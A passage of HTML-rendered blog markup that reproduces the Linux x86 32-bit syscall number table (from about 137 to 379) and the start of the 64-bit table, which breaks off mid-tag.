class="meta">#<span class="keyword">define</span> __NR_afs_syscall 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__llseek 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__newselect 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ugetrlimit 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap2 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate64 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate64 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat64 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat64 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat64 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown32 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid32 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid32 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid32 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid32 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid32 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid32 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups32 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups32 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown32 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid32 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid32 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid32 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid32 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown32 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid32 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid32 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid32 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid32 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile64 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs64 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs64 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64_64 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatat64 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 328</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 329</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 330</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 331</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 332</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 334</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 336</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 338</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 339</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 340</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 341</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 342</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 343</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 344</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 345</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 346</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 347</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 348</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 349</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 351</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 352</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 353</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 354</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 355</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 356</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 357</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 358</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 359</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 360</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 361</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 362</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 365</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 366</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 367</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 368</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 369</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 370</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 371</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 372</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 373</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 374</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 375</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 376</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 377</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 378</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure></div>
<h3 id="64-位"><a href="#64-位" class="headerlink" title="64 位"></a>64 位</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semget 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semop 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semctl 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmdt 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgget 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgsnd 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgrcv 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgctl 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 107</span></span><br><span class="line"><span 